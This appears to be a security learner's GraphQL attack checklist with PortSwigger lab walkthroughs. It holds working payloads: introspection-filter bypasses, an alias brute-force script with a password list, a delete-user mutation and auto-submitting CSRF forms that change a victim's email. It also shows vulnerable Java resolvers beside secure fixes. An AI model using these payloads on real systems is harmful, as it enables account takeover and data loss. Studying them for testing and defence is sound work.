tactic: Multiple

**GraphQL** is an API query language where clients define exactly what data they want. Unlike REST, a single endpoint handles all operations. Misconfigurations and missing access controls are extremely common because developers often focus on functionality over security, leaving introspection enabled, mutations unprotected, and rate limiting absent.

```
Queries      → fetch data (like GET)
Mutations    → add, change, delete data (like POST/PUT/DELETE)
Subscriptions → persistent connection, server pushes updates (like WebSocket)
```

## Finding GraphQL Endpoints

**Common paths to try:**

```
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
/v1/graphql
/graphiql
/playground
```

**Detection probe — send this to any suspected endpoint:**

json

```json
{"query": "{__typename}"}
```

If response contains `{"data": {"__typename": "Query"}}` → GraphQL confirmed.

**Try GET if POST is blocked:**

```
GET /graphql?query=query%7B__typename%7D
```

## Injection Points

- Query arguments (`id`, `username`, `email` fields passed to resolvers)
- Mutation inputs (change email, change password, delete user)
- Subscription parameters
- `variables` JSON object
- `operationName` field
- Introspection endpoints if enabled
- Custom directives

## Checklist

### Recon — Introspection

- [ ]  Test if introspection is enabled:

```json
	{"query": "{__schema{queryType{name}}}"}
```

- [ ]  If it works, run full introspection to map the entire schema:

```json
	{"query": "{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"}
```

- [ ]  Paste introspection result into **GraphQL Voyager** (`https://graphql-voyager.com/`) for visual schema map
- [ ]  In Burp: right-click request → GraphQL → Set Introspection Query → save to sitemap

### Bypass Introspection Restrictions

- [ ]  Try inserting special characters after `__schema` — some regex-based blocks only match exact string:

```
	{__schema
	{queryType{name}}}
```

```
The newline `\n` after `__schema` bypasses regex filters
```

- [ ]  Try via GET with URL-encoded newline:

```
	GET /api?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

- [ ]  Try comma as separator:

```json
	{"query": "{__schema,{queryType{name}}}"}
```

### IDOR via GraphQL Arguments

- [ ]  Find queries that accept an `id` argument — try incrementing it:

```graphql
	query getBlogPost($id: Int!) {
	    getBlogPost(id: $id) {
	        image
	        title
	        author
	        date
	        paragraphs
	        postPassword
	    }
	}
```

```
Variables: `{"id": 1}` → `{"id": 2}` → `{"id": 3}`
```

- [ ]  Look for fields that are defined in the schema but not shown in the UI — add them to your query manually (like `postPassword` above)
- [ ]  Check mutations for missing authorization — try deleting or modifying other users' objects

### Bypassing Rate Limits via Aliases

- [ ]  GraphQL allows aliasing the same query multiple times in one request — each alias is a separate operation but counts as one HTTP request:

```graphql
	query {
	    bruteforce0: login(input: {password: "123456", username: "carlos"}) { token success }
	    bruteforce1: login(input: {password: "password", username: "carlos"}) { token success }
	    bruteforce2: login(input: {password: "12345678", username: "carlos"}) { token success }
	}
```

- [ ]  Use this script in the browser console to auto-generate 100 aliased login attempts from a wordlist:

```javascript
	copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix`.split(',').map((element,index)=>` bruteforce${index}:login(input:{password: "${element}", username: "carlos"}) { token success } `).join('\n'));
	console.log("Copied to clipboard");
```

```
Paste the output into the GraphQL query body
```

### GraphQL CSRF

- [ ]  Check if the endpoint accepts `Content-Type: application/x-www-form-urlencoded` — this bypasses the JSON content type protection
- [ ]  To convert: in Burp, change method twice (POST → GET → POST) — Burp converts the body to form-encoded
- [ ]  URL-encode the query and build a CSRF PoC:

```
	query=mutation changeEmail($input: ChangeEmailInput!) {
	    changeEmail(input: $input) { email }
	}&operationName=changeEmail&variables={"input":{"email":"evil@attacker.com"}}
```

- [ ]  HTML form CSRF for GraphQL mutation:

```html
	<html>
	<body>
	    <form action="https://target.com/graphql/v1" method="POST">
	        <input type="hidden" name="query" value="mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }">
	        <input type="hidden" name="operationName" value="changeEmail">
	        <input type="hidden" name="variables" value='{"input":{"email":"evil@attacker.com"}}'>
	    </form>
	    <script>document.forms[0].submit();</script>
	</body>
	</html>
```

## Attack Payloads

**Introspection probe:**

```json
{"query": "{__schema{queryType{name}}}"}
```

**IDOR — enumerate blog posts looking for hidden fields:**

```graphql
query {
    getBlogPost(id: 3) {
        title
        author
        paragraphs
        postPassword
    }
}
```

**Alias brute force — 5 password attempts in one HTTP request:**

```graphql
query {
    login0: login(input: {password: "123456", username: "carlos"}) { token success }
    login1: login(input: {password: "password", username: "carlos"}) { token success }
    login2: login(input: {password: "letmein", username: "carlos"}) { token success }
    login3: login(input: {password: "qwerty", username: "carlos"}) { token success }
    login4: login(input: {password: "dragon", username: "carlos"}) { token success }
}
```

**Delete user mutation (after finding it via introspection):**

```graphql
mutation {
    deleteUser(id: 3) {
        success
    }
}
```

## White Box Testing

**Vulnerable, introspection enabled in production:**

```java
@Bean
public GraphQL graphQL() {
    // introspection is enabled by default in most GraphQL Java libraries
    // no restriction applied — anyone can dump the full schema
    return GraphQL.newGraphQL(buildSchema()).build();
}
```

**Vulnerable, resolver trusts user-supplied ID without authorization check:**

```java
@QueryMapping
public Post getBlogPost(@Argument int id) {
    // no check that the authenticated user is allowed to see this post
    return postRepository.findById(id).orElseThrow();
    // attacker increments id to access private posts
}
```

**Vulnerable, mutation accepts form-encoded content type — CSRF possible:**

```java
@Configuration
public class GraphQLConfig {
    // no Content-Type validation configured
    // GraphQL endpoint accepts both application/json AND application/x-www-form-urlencoded
    // allows CSRF via HTML form without CORS restriction
}
```

**Vulnerable, no rate limiting on login mutation — alias brute force works:**

```java
@MutationMapping
public AuthPayload login(@Argument LoginInput input) {
    // no rate limiting, no lockout, no CAPTCHA
    // 100 alias queries = 100 password attempts in 1 HTTP request
    return authService.login(input.getUsername(), input.getPassword());
}
```

**Secure:**

```java
// Disable introspection in production
@Bean
public Instrumentation maxQueryDepthInstrumentation() {
    return new MaxQueryDepthInstrumentation(10); // limit query depth too
}

@Bean
public GraphQL graphQL(GraphQLSchema schema) {
    return GraphQL.newGraphQL(schema)
        .instrumentation(new ChainedInstrumentation(List.of(
            new MaxQueryDepthInstrumentation(10),
            new MaxQueryComplexityInstrumentation(100)
        )))
        .build();
}

// Disable introspection via custom instrumentation
public class DisableIntrospectionInstrumentation extends SimpleInstrumentation {
    @Override
    public DataFetcher<?> instrumentDataFetcher(DataFetcher<?> fetcher, InstrumentationFieldFetchParameters params) {
        if (params.getField().getName().startsWith("__")) {
            return env -> null; // block all introspection fields
        }
        return fetcher;
    }
}

// Authorization in resolvers — always scope to the authenticated user
@QueryMapping
public Post getBlogPost(@Argument int id, @AuthenticationPrincipal UserDetails user) {
    Post post = postRepository.findById(id).orElseThrow();
    if (!post.isPublic() && !post.getAuthorId().equals(user.getId())) {
        throw new AccessDeniedException("Not authorized");
    }
    return post;
}

// Enforce JSON content type only — prevent form-encoded CSRF
@Bean
public WebMvcConfigurer graphQLContentTypeEnforcer() {
    return new WebMvcConfigurer() {
        @Override
        public void addInterceptors(InterceptorRegistry registry) {
            registry.addInterceptor(new HandlerInterceptorAdapter() {
                @Override
                public boolean preHandle(HttpServletRequest req, HttpServletResponse res, Object handler) {
                    if (req.getRequestURI().contains("/graphql")) {
                        String ct = req.getContentType();
                        if (ct == null || !ct.contains("application/json")) {
                            res.setStatus(415);
                            return false;
                        }
                    }
                    return true;
                }
            });
        }
    };
}

// Rate limiting on mutations using Bucket4j or similar
@MutationMapping
public AuthPayload login(@Argument LoginInput input, HttpServletRequest request) {
    String ip = request.getRemoteAddr();
    if (!rateLimiter.tryConsume(ip)) {
        throw new RuntimeException("Rate limit exceeded");
    }
    return authService.login(input.getUsername(), input.getPassword());
}
```

# LABS

**Accessing private GraphQL posts**

- find the graphQl queries in burp 
- try introspection  `{ "query": "{__schema{queryType{name}}}" }
- this has a result try the fullscale mode and visualize -> burp -> greaphql set introspecting 
- find a query and try idor and other vulns 

```graphql

    query getBlogPost($id: Int!) {
        getBlogPost(id: $id) {
            image
            title
            author
            date
            paragraphs
          postPassword -> added
        }
    }
```

``` variable 
{"id":3}
```



**Accidental exposure of private GraphQL fields**


- set introspecter full
- save the graph in sitemap
- check sitemap and enum id




 **Finding a hidden GraphQL endpoint**


```
query{__schema
     {queryType{name}}}
```


- after trying the endpoint i found out that `/api` has a response of query not found
- its a `GET` so i tried this `GET /api?query=query%7b__schema%0a+++++%7bqueryType%7bname%7d%7d%7d`
- worked but in the graphql section  i saw it should be parsed in a specific order 
- like this 
```
query{__schema
     {queryType{name}}}
```

- where after schema should be `\n` 
- then after setting the full scale i adapted it to this format and it worked 
- save it to the sitemap
- get the user carlo
- then delete it in the delete orf user input 



 **Bypassing GraphQL brute force protections**

- use this script
```
``copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>` bruteforce$index:login(input:{password: "$password", username: "carlos"}) { token success } `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");``
```

paste it in the browser console and it will generate basically the parameter that we can place in the graphql for bypass bruteforce 


**Performing CSRF exploits over GraphQL**

-  to convert the request into POST with `content-type` of `x-www-form-urencoded` change the request method TWICE
- take the graphql and URL encoded with the variable 

```
 query=
    mutation changeEmail($input: ChangeEmailInput!) {
        changeEmail(input: $input) {
            email
        }
    }
&operationName=changeEmail&variables={"input":{"email":"test@hacker.com"}}
```

url encode it and POC csrf

``` html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a860060033d5d0b80a62bc600540046.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="&#10;&#32;&#32;&#32;&#32;mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;email&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#10;&#32;&#32;&#32;&#32;&#125;&#10;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;a&#64;a&#46;com&quot;&#125;&#125;" />
      <input type="hidden" name="&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```



## Resources

- [PortSwigger GraphQL](https://portswigger.net/web-security/graphql)
- [HackTricks GraphQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)
- [GraphQL Voyager](https://graphql-voyager.com/)
- [PayloadsAllTheThings GraphQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
- [InQL Burp Extension](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
